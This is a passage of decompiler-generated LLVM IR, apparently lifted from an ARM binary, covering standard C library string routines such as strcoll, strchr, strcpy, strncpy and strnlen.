  store i8 %v1_249ec, i8* %v3_249ec, align 1
  %v4_249ec = load i32, i32* %r3.global-to-local, align 4
  %v5_249ec = add i32 %v4_249ec, 1
  store i32 %v5_249ec, i32* %r3.global-to-local, align 4
  %v0_249f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_249f0 = trunc i32 %v0_249f0 to i8
  %v3_249f0 = inttoptr i32 %v5_249ec to i8*
  store i8 %v1_249f0, i8* %v3_249f0, align 1
  %v4_249f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_249f0 = add i32 %v4_249f0, 1
  store i32 %v5_249f0, i32* %r3.global-to-local, align 4
  %v0_249f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_249f4 = trunc i32 %v0_249f4 to i8
  %v3_249f4 = inttoptr i32 %v5_249f0 to i8*
  store i8 %v1_249f4, i8* %v3_249f4, align 1
  %v4_249f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_249f4 = add i32 %v4_249f4, 1
  store i32 %v5_249f4, i32* @r3, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_24990, { 1, 0 }
  uselistorder i32 %v12_249bc, { 1, 2, 0 }
  uselistorder i32 %v0_2499054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_24988.pr, { 0, 2, 1 }
  uselistorder i32 %v6_24978, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_2496c, { 1, 0 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 8, 7, 6, 4, 5, 10, 11, 12, 13, 9, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 1, 4, 0, 9, 8, 5, 7 }
  uselistorder i32 %arg3, { 1, 0, 3, 2, 4 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_249c8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_249a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_24a04.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_24a04 = phi i32 [ %v0_24a04.pre, %bb ], [ %v5_24a04, %bb3 ]
  %v0_24a00 = phi i32 [ %tmp, %bb ], [ %v5_24a00, %bb3 ]
  %v1_24a00 = inttoptr i32 %v0_24a00 to i8*
  %v2_24a00 = load i8, i8* %v1_24a00, align 1
  %v3_24a00 = zext i8 %v2_24a00 to i32
  store i32 %v3_24a00, i32* @r2, align 4
  %v1_24a04 = inttoptr i32 %v0_24a04 to i8*
  %v2_24a04 = load i8, i8* %v1_24a04, align 1
  %v3_24a04 = zext i8 %v2_24a04 to i32
  %v2_24a08 = icmp eq i8 %v2_24a00, 0
  br i1 %v2_24a08, label %.dec_label_pc_24a14_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_24a04 = add i32 %v0_24a04, 1
  %v5_24a00 = add i32 %v0_24a00, 1
  %v10_24a0c = icmp eq i8 %v2_24a00, %v2_24a04
  br i1 %v10_24a0c, label %entry, label %dec_label_pc_24a14

.dec_label_pc_24a14_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_24a14

dec_label_pc_24a14:                               ; preds = %bb3, %.dec_label_pc_24a14_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_24a14_crit_edge ], [ %v3_24a00, %bb3 ]
  %v2_24a14.pre-phi = sub nsw i32 %.pn, %v3_24a04
  ret i32 %v2_24a14.pre-phi

; uselistorder directives
  uselistorder i32 %v0_24a00, { 1, 0 }
  uselistorder i32 %v0_24a04, { 1, 0 }
  uselistorder label %dec_label_pc_24a14, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_24a84 = urem i32 %arg1, 256
  %v0_24aa43 = load i32, i32* @r0, align 4
  %v1_24aa44 = urem i32 %v0_24aa43, 4
  %v2_24aa45 = icmp eq i32 %v1_24aa44, 0
  br i1 %v2_24aa45, label %dec_label_pc_24aac, label %dec_label_pc_24a8c

dec_label_pc_24a8c:                               ; preds = %entry, %dec_label_pc_24aa0
  %v0_24aa0 = phi i32 [ %v1_24aa0, %dec_label_pc_24aa0 ], [ %v0_24aa43, %entry ]
  %v1_24a8c = inttoptr i32 %v0_24aa0 to i8*
  %v2_24a8c = load i8, i8* %v1_24a8c, align 1
  %v3_24a8c = zext i8 %v2_24a8c to i32
  store i32 %v3_24a8c, i32* @r3, align 4
  %v9_24a90 = icmp eq i32 %v3_24a8c, %v1_24a84
  br i1 %v9_24a90, label %dec_label_pc_24b60, label %dec_label_pc_24a98

dec_label_pc_24a98:                               ; preds = %dec_label_pc_24a8c
  %v2_24a98 = icmp eq i8 %v2_24a8c, 0
  br i1 %v2_24a98, label %dec_label_pc_24b5c, label %dec_label_pc_24aa0

dec_label_pc_24aa0:                               ; preds = %dec_label_pc_24a98
  %v1_24aa0 = add i32 %v0_24aa0, 1
  %v1_24aa4 = urem i32 %v1_24aa0, 4
  %v2_24aa4 = icmp eq i32 %v1_24aa4, 0
  br i1 %v2_24aa4, label %dec_label_pc_24aac, label %dec_label_pc_24a8c

dec_label_pc_24aac:                               ; preds = %dec_label_pc_24aa0, %entry
  %v0_24ab0 = phi i32 [ %v0_24aa43, %entry ], [ %v1_24aa0, %dec_label_pc_24aa0 ]
  %v4_24aac = mul nuw nsw i32 %v1_24a84, 256
  %v5_24aac = or i32 %v4_24aac, %v1_24a84
  %v4_24ab4 = mul i32 %v5_24aac, 65536
  %v5_24ab4 = or i32 %v4_24ab4, %v5_24aac
  br label %dec_label_pc_24ab8

dec_label_pc_24ab8:                               ; preds = %dec_label_pc_24b54, %dec_label_pc_24af4, %dec_label_pc_24aac
  %v0_24b1c = phi i32 [ %v0_24ab0, %dec_label_pc_24aac ], [ %v4_24ab8, %dec_label_pc_24af4 ], [ %v4_24ab8, %dec_label_pc_24b54 ]
  %v1_24ab8 = inttoptr i32 %v0_24b1c to i32*
  %v2_24ab8 = load i32, i32* %v1_24ab8, align 4
  %v4_24ab8 = add i32 %v0_24b1c, 4
  %v2_24ac0 = xor i32 %v2_24ab8, %v5_24ab4
  %v2_24ac4 = add i32 %v2_24ac0, 2130640639
  store i32 %v2_24ac4, i32* @ip, align 4
  %v2_24acc = add i32 %v2_24ab8, 2130640639
  %v1_24ad0 = sub i32 -1, %v2_24ab8
  %v2_24ad4 = xor i32 %v2_24acc, %v1_24ad0
  %v2_24ae0 = and i32 %v2_24ad4, -2130640640
  %v2_24ae8 = icmp eq i32 %v2_24ae0, 0
  br i1 %v2_24ae8, label %dec_label_pc_24af4, label %dec_label_pc_24afc

dec_label_pc_24af4:                               ; preds = %dec_label_pc_24ab8
  %v1_24adc = sub i32 -1, %v2_24ac0
  %v2_24ae4 = xor i32 %v2_24ac4, %v1_24adc
  %v2_24aec = and i32 %v2_24ae4, -2130640640
  %v2_24af4 = icmp eq i32 %v2_24aec, 0
  br i1 %v2_24af4, label %dec_label_pc_24ab8, label %dec_label_pc_24afc

dec_label_pc_24afc:                               ; preds = %dec_label_pc_24ab8, %dec_label_pc_24af4
  %v2_24afc = inttoptr i32 %v0_24b1c to i8*
  %v3_24afc = load i8, i8* %v2_24afc, align 1
  %v4_24afc = zext i8 %v3_24afc to i32
  store i32 %v4_24afc, i32* @r3, align 4
  %v9_24b00 = icmp eq i32 %v4_24afc, %v1_24a84
  br i1 %v9_24b00, label %dec_label_pc_24b60, label %dec_label_pc_24b0c

dec_label_pc_24b0c:                               ; preds = %dec_label_pc_24afc
  %v2_24b0c = icmp eq i8 %v3_24afc, 0
  br i1 %v2_24b0c, label %dec_label_pc_24b5c, label %dec_label_pc_24b14

dec_label_pc_24b14:                               ; preds = %dec_label_pc_24b0c
  %v1_24b14 = add i32 %v0_24b1c, 1
  %v2_24b14 = inttoptr i32 %v1_24b14 to i8*
  %v3_24b14 = load i8, i8* %v2_24b14, align 1
  %v4_24b14 = zext i8 %v3_24b14 to i32
  store i32 %v4_24b14, i32* @r3, align 4
  %v9_24b18 = icmp eq i32 %v4_24b14, %v1_24a84
  br i1 %v9_24b18, label %dec_label_pc_24b60, label %dec_label_pc_24b24

dec_label_pc_24b24:                               ; preds = %dec_label_pc_24b14
  %v2_24b24 = icmp eq i8 %v3_24b14, 0
  br i1 %v2_24b24, label %dec_label_pc_24b5c, label %dec_label_pc_24b2c

dec_label_pc_24b2c:                               ; preds = %dec_label_pc_24b24
  %v1_24b2c = add i32 %v0_24b1c, 2
  %v2_24b2c = inttoptr i32 %v1_24b2c to i8*
  %v3_24b2c = load i8, i8* %v2_24b2c, align 1
  %v4_24b2c = zext i8 %v3_24b2c to i32
  store i32 %v4_24b2c, i32* @r3, align 4
  %v9_24b30 = icmp eq i32 %v4_24b2c, %v1_24a84
  br i1 %v9_24b30, label %dec_label_pc_24b60, label %dec_label_pc_24b3c

dec_label_pc_24b3c:                               ; preds = %dec_label_pc_24b2c
  %v2_24b3c = icmp eq i8 %v3_24b2c, 0
  br i1 %v2_24b3c, label %dec_label_pc_24b5c, label %dec_label_pc_24b44

dec_label_pc_24b44:                               ; preds = %dec_label_pc_24b3c
  %v1_24b44 = add i32 %v0_24b1c, 3
  %v2_24b44 = inttoptr i32 %v1_24b44 to i8*
  %v3_24b44 = load i8, i8* %v2_24b44, align 1
  %v4_24b44 = zext i8 %v3_24b44 to i32
  store i32 %v4_24b44, i32* @r3, align 4
  %v9_24b48 = icmp eq i32 %v4_24b44, %v1_24a84
  br i1 %v9_24b48, label %dec_label_pc_24b60, label %dec_label_pc_24b54

dec_label_pc_24b54:                               ; preds = %dec_label_pc_24b44
  %v2_24b54 = icmp eq i8 %v3_24b44, 0
  br i1 %v2_24b54, label %dec_label_pc_24b5c, label %dec_label_pc_24ab8

dec_label_pc_24b5c:                               ; preds = %dec_label_pc_24a98, %dec_label_pc_24b54, %dec_label_pc_24b3c, %dec_label_pc_24b24, %dec_label_pc_24b0c
  br label %dec_label_pc_24b60

dec_label_pc_24b60:                               ; preds = %dec_label_pc_24a8c, %dec_label_pc_24b44, %dec_label_pc_24b2c, %dec_label_pc_24b14, %dec_label_pc_24afc, %dec_label_pc_24b5c
  %v1_24b64 = phi i32 [ 0, %dec_label_pc_24b5c ], [ %v1_24b44, %dec_label_pc_24b44 ], [ %v1_24b2c, %dec_label_pc_24b2c ], [ %v1_24b14, %dec_label_pc_24b14 ], [ %v0_24b1c, %dec_label_pc_24afc ], [ %v0_24aa0, %dec_label_pc_24a8c ]
  ret i32 %v1_24b64

; uselistorder directives
  uselistorder i32 %v4_24ab8, { 1, 0 }
  uselistorder i32 %v2_24ab8, { 0, 2, 1 }
  uselistorder i32 %v0_24b1c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_24aac, { 1, 0 }
  uselistorder i32 %v1_24aa0, { 1, 0, 2 }
  uselistorder i32 %v0_24aa43, { 2, 1, 0 }
  uselistorder i32 %v1_24a84, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder label %dec_label_pc_24b60, { 5, 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_24b5c, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_24afc, { 1, 0 }
  uselistorder label %dec_label_pc_24a8c, { 1, 0 }
}

define i32 @strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  %v0_24b801 = load i32, i32* @r1, align 4
  %v1_24b802 = inttoptr i32 %v0_24b801 to i8*
  %v2_24b803 = load i8, i8* %v1_24b802, align 1
  %v2_24b845 = icmp eq i8 %v2_24b803, 0
  store i1 %v2_24b845, i1* %cpsr_z.global-to-local, align 1
  store i8 %v2_24b803, i8* %arg1, align 1
  br i1 %v2_24b845, label %dec_label_pc_24b90, label %dec_label_pc_24b78

dec_label_pc_24b78:                               ; preds = %entry, %dec_label_pc_24b78
  %v0_24b78 = load i32, i32* @r1, align 4
  %v1_24b78 = add i32 %v0_24b78, 1
  store i32 %v1_24b78, i32* @r1, align 4
  %v0_24b7c = load i32, i32* %r2.global-to-local, align 4
  %v1_24b7c = add i32 %v0_24b7c, 1
  store i32 %v1_24b7c, i32* %r2.global-to-local, align 4
  %v1_24b80 = inttoptr i32 %v1_24b78 to i8*
  %v2_24b80 = load i8, i8* %v1_24b80, align 1
  %v2_24b84 = icmp eq i8 %v2_24b80, 0
  store i1 %v2_24b84, i1* %cpsr_z.global-to-local, align 1
  %v3_24b88 = inttoptr i32 %v1_24b7c to i8*
  store i8 %v2_24b80, i8* %v3_24b88, align 1
  %v0_24b8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_24b8c, label %dec_label_pc_24b90, label %dec_label_pc_24b78

dec_label_pc_24b90:                               ; preds = %dec_label_pc_24b78, %entry
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_24b78, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %v7_24b94 = icmp eq i32 %arg2, 3
  store i1 %v7_24b94, i1* %cpsr_z.global-to-local, align 1
  %v0_24b98 = load i32, i32* @lr, align 4
  store i32 %v0_24b98, i32* %stack_var_-4, align 4
  %v1_24b9c = add i32 %arg1, -1
  store i32 %v1_24b9c, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_24c18, label %dec_label_pc_24ba4

dec_label_pc_24ba4:                               ; preds = %entry
  %v3_24ba4 = udiv i32 %arg2, 4
  store i32 %v3_24ba4, i32* %lr.global-to-local, align 4
  %v0_24ba8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_24ba8

dec_label_pc_24ba8:                               ; preds = %dec_label_pc_24bf4, %dec_label_pc_24ba4
  %v2_24bb0 = phi i32 [ %v6_24be8, %dec_label_pc_24bf4 ], [ %v1_24b9c, %dec_label_pc_24ba4 ]
  %v0_24ba8 = phi i32 [ %v1_24bf8, %dec_label_pc_24bf4 ], [ %v0_24ba8.pre, %dec_label_pc_24ba4 ]
  %v1_24ba8 = inttoptr i32 %v0_24ba8 to i8*
  %v2_24ba8 = load i8, i8* %v1_24ba8, align 1
  %v3_24ba8 = zext i8 %v2_24ba8 to i32
  store i32 %v3_24ba8, i32* %r3.global-to-local, align 4
  %v2_24bac = icmp eq i8 %v2_24ba8, 0
  store i1 %v2_24bac, i1* %cpsr_z.global-to-local, align 1
  %v3_24bb0 = add i32 %v2_24bb0, 1
  %v4_24bb0 = inttoptr i32 %v3_24bb0 to i8*
  store i8 %v2_24ba8, i8* %v4_24bb0, align 1
  %v5_24bb0 = load i32, i32* @ip, align 4
  %v6_24bb0 = add i32 %v5_24bb0, 1
  store i32 %v6_24bb0, i32* @ip, align 4
  %v0_24bb4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_24bb4, label %dec_label_pc_24c04, label %dec_label_pc_24bb8

dec_label_pc_24bb8:                               ; preds = %dec_label_pc_24ba8
  %v0_24bb8 = load i32, i32* @r1, align 4
  %v1_24bb8 = add i32 %v0_24bb8, 1
  %v2_24bb8 = inttoptr i32 %v1_24bb8 to i8*
  %v3_24bb8 = load i8, i8* %v2_24bb8, align 1
  %v4_24bb8 = zext i8 %v3_24bb8 to i32
  store i32 %v4_24bb8, i32* %r3.global-to-local, align 4
  %v2_24bbc = icmp eq i8 %v3_24bb8, 0
  store i1 %v2_24bbc, i1* %cpsr_z.global-to-local, align 1
  %v3_24bc0 = add i32 %v5_24bb0, 2
  %v4_24bc0 = inttoptr i32 %v3_24bc0 to i8*
  store i8 %v3_24bb8, i8* %v4_24bc0, align 1
  %v5_24bc0 = load i32, i32* @ip, align 4
  %v6_24bc0 = add i32 %v5_24bc0, 1
  store i32 %v6_24bc0, i32* @ip, align 4
  %v0_24bc4 = load i32, i32* @r1, align 4
  %v1_24bc4 = add i32 %v0_24bc4, 1
  store i32 %v1_24bc4, i32* %r1.global-to-local, align 4
  %v0_24bc8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_24bc8, label %dec_label_pc_24c04, label %dec_label_pc_24bcc

dec_label_pc_24bcc:                               ; preds = %dec_label_pc_24bb8
  %v1_24bcc = add i32 %v0_24bc4, 2
  %v2_24bcc = inttoptr i32 %v1_24bcc to i8*
  %v3_24bcc = load i8, i8* %v2_24bcc, align 1
  %v4_24bcc = zext i8 %v3_24bcc to i32
  store i32 %v4_24bcc, i32* %r3.global-to-local, align 4
  %v2_24bd0 = icmp eq i8 %v3_24bcc, 0
  store i1 %v2_24bd0, i1* %cpsr_z.global-to-local, align 1
  %v3_24bd4 = add i32 %v5_24bc0, 2
  %v4_24bd4 = inttoptr i32 %v3_24bd4 to i8*
  store i8 %v3_24bcc, i8* %v4_24bd4, align 1
  %v5_24bd4 = load i32, i32* @ip, align 4
  %v6_24bd4 = add i32 %v5_24bd4, 1
  store i32 %v6_24bd4, i32* @ip, align 4
  %v0_24bd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_24bd8 = add i32 %v0_24bd8, 1
  store i32 %v1_24bd8, i32* %r1.global-to-local, align 4
  %v0_24bdc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_24bdc, label %dec_label_pc_24c04, label %dec_label_pc_24be0

dec_label_pc_24be0:                               ; preds = %dec_label_pc_24bcc
  %v1_24be0 = add i32 %v0_24bd8, 2
  %v2_24be0 = inttoptr i32 %v1_24be0 to i8*
  %v3_24be0 = load i8, i8* %v2_24be0, align 1
  %v4_24be0 = zext i8 %v3_24be0 to i32
  store i32 %v4_24be0, i32* %r3.global-to-local, align 4
  %v2_24be4 = icmp eq i8 %v3_24be0, 0
  store i1 %v2_24be4, i1* %cpsr_z.global-to-local, align 1
  %v3_24be8 = add i32 %v5_24bd4, 2
  %v4_24be8 = inttoptr i32 %v3_24be8 to i8*
  store i8 %v3_24be0, i8* %v4_24be8, align 1
  %v5_24be8 = load i32, i32* @ip, align 4
  %v6_24be8 = add i32 %v5_24be8, 1
  store i32 %v6_24be8, i32* @ip, align 4
  %v0_24bec = load i32, i32* %r1.global-to-local, align 4
  %v1_24bec = add i32 %v0_24bec, 1
  store i32 %v1_24bec, i32* %r1.global-to-local, align 4
  %v0_24bf0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_24bf0, label %dec_label_pc_24c04, label %dec_label_pc_24bf4

dec_label_pc_24bf4:                               ; preds = %dec_label_pc_24be0
  %v0_24bf4 = load i32, i32* %lr.global-to-local, align 4
  %v1_24bf4 = add i32 %v0_24bf4, -1
  store i32 %v1_24bf4, i32* %lr.global-to-local, align 4
  %v7_24bf4 = icmp eq i32 %v0_24bf4, 1
  store i1 %v7_24bf4, i1* %cpsr_z.global-to-local, align 1
  %v1_24bf8 = add i32 %v0_24bec, 2
  store i32 %v1_24bf8, i32* @r1, align 4
  br i1 %v7_24bf4, label %dec_label_pc_24c18, label %dec_label_pc_24ba8

dec_label_pc_24c04:                               ; preds = %dec_label_pc_24be0, %dec_label_pc_24bcc, %dec_label_pc_24bb8, %dec_label_pc_24ba8
  %v1_24c04 = phi i32 [ %v6_24be8, %dec_label_pc_24be0 ], [ %v6_24bd4, %dec_label_pc_24bcc ], [ %v6_24bc0, %dec_label_pc_24bb8 ], [ %v6_24bb0, %dec_label_pc_24ba8 ]
  %v2_24c041 = sub i32 %arg1, %v1_24c04
  %v2_24c08 = add i32 %v2_24c041, %arg2
  %v1_24c0c = add i32 %v2_24c08, -1
  store i32 %v1_24c0c, i32* %r3.global-to-local, align 4
  %v7_24c0c = icmp eq i32 %v2_24c08, 1
  store i1 %v7_24c0c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_24c0c, label %dec_label_pc_24c48, label %dec_label_pc_24c38

dec_label_pc_24c18:                               ; preds = %dec_label_pc_24bf4, %entry
  %v2_24c287 = phi i32 [ %v1_24b9c, %entry ], [ %v6_24be8, %dec_label_pc_24bf4 ]
  %v1_24c18 = urem i32 %arg2, 4
  store i32 %v1_24c18, i32* %r3.global-to-local, align 4
  %v2_24c18 = icmp eq i32 %v1_24c18, 0
  store i1 %v2_24c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_24c18, label %dec_label_pc_24c48, label %dec_label_pc_24c20

dec_label_pc_24c20:                               ; preds = %dec_label_pc_24c18, %dec_label_pc_24c30.dec_label_pc_24c20_crit_edge
  %v2_24c28 = phi i32 [ %v6_24c28, %dec_label_pc_24c30.dec_label_pc_24c20_crit_edge ], [ %v2_24c287, %dec_label_pc_24c18 ]
  %v0_24c24 = phi i32 [ %v0_24c24.pre, %dec_label_pc_24c30.dec_label_pc_24c20_crit_edge ], [ %v1_24c18, %dec_label_pc_24c18 ]
  %v0_24c20 = load i32, i32* @r1, align 4
  %v1_24c20 = inttoptr i32 %v0_24c20 to i8*
  %v2_24c20 = load i8, i8* %v1_24c20, align 1
  %v3_24c20 = zext i8 %v2_24c20 to i32
  store i32 %v3_24c20, i32* %r2.global-to-local, align 4
  %v5_24c20 = add i32 %v0_24c20, 1
  store i32 %v5_24c20, i32* @r1, align 4
  %v1_24c24 = add i32 %v0_24c24, -1
  store i32 %v1_24c24, i32* %r3.global-to-local, align 4
  %v7_24c24 = icmp eq i32 %v0_24c24, 1
  store i1 %v7_24c24, i1* %cpsr_z.global-to-local, align 1
  %v3_24c28 = add i32 %v2_24c28, 1
  %v4_24c28 = inttoptr i32 %v3_24c28 to i8*
  store i8 %v2_24c20, i8* %v4_24c28, align 1
  %v5_24c28 = load i32, i32* @ip, align 4
  %v6_24c28 = add i32 %v5_24c28, 1
  store i32 %v6_24c28, i32* @ip, align 4
  %v0_24c2c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_24c2c, label %dec_label_pc_24c48, label %dec_label_pc_24c30

dec_label_pc_24c30:                               ; preds = %dec_label_pc_24c20
  %v0_24c30 = load i32, i32* %r2.global-to-local, align 4
  %v2_24c30 = icmp eq i32 %v0_24c30, 0
  store i1 %v2_24c30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_24c30, label %dec_label_pc_24c38, label %dec_label_pc_24c30.dec_label_pc_24c20_crit_edge

dec_label_pc_24c30.dec_label_pc_24c20_crit_edge:  ; preds = %dec_label_pc_24c30
  %v0_24c24.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_24c20

dec_label_pc_24c38:                               ; preds = %dec_label_pc_24c30, %dec_label_pc_24c04
  %v2_24c4010 = phi i32 [ %v1_24c04, %dec_label_pc_24c04 ], [ %v6_24c28, %dec_label_pc_24c30 ]
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_24c3c

dec_label_pc_24c3c:                               ; preds = %dec_label_pc_24c3c.dec_label_pc_24c3c_crit_edge, %dec_label_pc_24c38
  %v2_24c40 = phi i32 [ %v6_24c40, %dec_label_pc_24c3c.dec_label_pc_24c3c_crit_edge ], [ %v2_24c4010, %dec_label_pc_24c38 ]
  %v0_24c40.off0 = phi i8 [ %extract.t, %dec_label_pc_24c3c.dec_label_pc_24c3c_crit_edge ], [ 0, %dec_label_pc_24c38 ]
  %v0_24c3c = load i32, i32* %r3.global-to-local, align 4
  %v1_24c3c = add i32 %v0_24c3c, -1
  store i32 %v1_24c3c, i32* %r3.global-to-local, align 4
  %v7_24c3c = icmp eq i32 %v0_24c3c, 1
  store i1 %v7_24c3c, i1* %cpsr_z.global-to-local, align 1
  %v3_24c40 = add i32 %v2_24c40, 1
  %v4_24c40 = inttoptr i32 %v3_24c40 to i8*
  store i8 %v0_24c40.off0, i8* %v4_24c40, align 1
  %v5_24c40 = load i32, i32* @ip, align 4
  %v6_24c40 = add i32 %v5_24c40, 1
  store i32 %v6_24c40, i32* @ip, align 4
  %v0_24c44 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_24c44, label %dec_label_pc_24c48, label %dec_label_pc_24c3c.dec_label_pc_24c3c_crit_edge

dec_label_pc_24c3c.dec_label_pc_24c3c_crit_edge:  ; preds = %dec_label_pc_24c3c
  %v0_24c40.pre = load i32, i32* %r2.global-to-local, align 4
  %extract.t = trunc i32 %v0_24c40.pre to i8
  br label %dec_label_pc_24c3c

dec_label_pc_24c48:                               ; preds = %dec_label_pc_24c20, %dec_label_pc_24c3c, %dec_label_pc_24c04, %dec_label_pc_24c18
  %v2_24c48 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_24c48, i32* @lr, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v6_24c40, { 1, 0 }
  uselistorder i32 %v0_24c3c, { 1, 0 }
  uselistorder i32 %v6_24c28, { 0, 2, 1 }
  uselistorder i32 %v1_24c18, { 2, 1, 0 }
  uselistorder i32 %v2_24c08, { 1, 0 }
  uselistorder i32 %v1_24bf8, { 1, 0 }
  uselistorder i32 %v0_24bf4, { 1, 0 }
  uselistorder i32 %v6_24be8, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 4, 1, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_24c48, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_24c20, { 1, 0 }
}

define i32 @strnlen(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_24c50 = icmp eq i32 %arg2, 0
  br i1 %v2_24c50, label %bb, label %dec_label_pc_24c64

bb:                                               ; preds = %entry
  br label %bb25

dec_label_pc_24c64:                               ; preds = %entry
  %v2_24c64 = add i32 %tmp, %arg2
  %v3_24c64 = icmp ult i32 %v2_24c64, %tmp
  br i1 %v3_24c64, label %bb19, label %bb20

bb19:                                             ; preds = %dec_label_pc_24c64
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_24c64, %bb19
  %v5_24d04 = phi i32 [ %v2_24c64, %dec_label_pc_24c64 ], [ -1, %bb19 ]
  %v1_24c844 = urem i32 %tmp, 4
  %v2_24c845 = icmp eq i32 %v1_24c844, 0
  br i1 %v2_24c845, label %dec_label_pc_24c8c, label %dec_label_pc_24c74

dec_label_pc_24c74:                               ; preds = %bb20, %dec_label_pc_24c80
  %v0_24c80 = phi i32 [ %v1_24c80, %dec_label_pc_24c80 ], [ %tmp, %bb20 ]
  %v1_24c74 = inttoptr i32 %v0_24c80 to i8*
  %v2_24c74 = load i8, i8* %v1_24c74, align 1
  %v2_24c78 = icmp eq i8 %v2_24c74, 0
  br i1 %v2_24c78, label %dec_label_pc_24d00, label %dec_label_pc_24c80

dec_label_pc_24c80:                               ; preds = %dec_label_pc_24c74
  %v1_24c80 = add i32 %v0_24c80, 1
  %v1_24c84 = urem i32 %v1_24c80, 4
  %v2_24c84 = icmp eq i32 %v1_24c84, 0
  br i1 %v2_24c84, label %dec_label_pc_24c8c, label %dec_label_pc_24c74

dec_label_pc_24c8c:                               ; preds = %dec_label_pc_24c80, %bb20
  %storemerge.lcssa = phi i32 [ %tmp, %bb20 ], [ %v1_24c80, %dec_label_pc_24c80 ]
  %v3_24cf030 = icmp ult i32 %storemerge.lcssa, %v5_24d04
  store i32 -2139062144, i32* @ip, align 4
  br i1 %v3_24cf030, label %dec_label_pc_24c94, label %dec_label_pc_24d00

dec_label_pc_24c94:                               ; preds = %dec_label_pc_24cec, %dec_label_pc_24c8c
  %v0_24ce437 = phi i32 [ %v4_24c94, %dec_label_pc_24cec ], [ %storemerge.lcssa, %dec_label_pc_24c8c ]
  %v1_24c94 = inttoptr i32 %v0_24ce437 to i32*
  %v2_24c94 = load i32, i32* %v1_24c94, align 4
  %v4_24c94 = add i32 %v0_24ce437, 4
  %v2_24c98 = add i32 %v2_24c94, -16843009
  %v2_24c9c = and i32 %v2_24c98, -2139062144
  store i32 %v2_24c9c, i32* @ip, align 4
  %v2_24ca0 = icmp eq i32 %v2_24c9c, 0
  br i1 %v2_24ca0, label %dec_label_pc_24cec, label %dec_label_pc_24ca8

dec_label_pc_24ca8:                               ; preds = %dec_label_pc_24c94
  %v2_24ca8 = inttoptr i32 %v0_24ce437 to i8*
  %v3_24ca8 = load i8, i8* %v2_24ca8, align 1
  %v2_24cac = icmp eq i8 %v3_24ca8, 0
  br i1 %v2_24cac, label %bb21, label %dec_label_pc_24cbc

bb21:                                             ; preds = %dec_label_pc_24ca8
  br label %dec_label_pc_24d00

dec_label_pc_24cbc:                               ; preds = %dec_label_pc_24ca8
  %v1_24cbc = add i32 %v0_24ce437, 1
  %v2_24cbc = inttoptr i32 %v1_24cbc to i8*
  %v3_24cbc = load i8, i8* %v2_24cbc, align 1
  %v2_24cc0 = icmp eq i8 %v3_24cbc, 0
  br i1 %v2_24cc0, label %dec_label_pc_24d00, label %dec_label_pc_24ccc

